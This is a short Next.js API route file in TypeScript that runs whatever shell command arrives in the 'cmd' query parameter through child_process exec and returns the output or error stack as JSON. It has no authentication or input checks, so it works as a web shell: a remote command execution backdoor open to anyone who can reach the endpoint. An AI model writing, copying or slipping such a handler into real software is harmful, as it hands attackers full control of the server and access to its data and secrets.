import { exec } from "child_process";
import { NextApiRequest, NextApiResponse } from "next";
import { promisify } from "util";

const execAsync = promisify(exec);

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  const { cmd } = req.query;
  try {
    const execData = await execAsync(String(cmd!) || "ls");
    res.status(200).json({ status: true, execData });
  } catch (error: any) {
    res.status(500).json({ status: false, error: error.stack });
  }
}
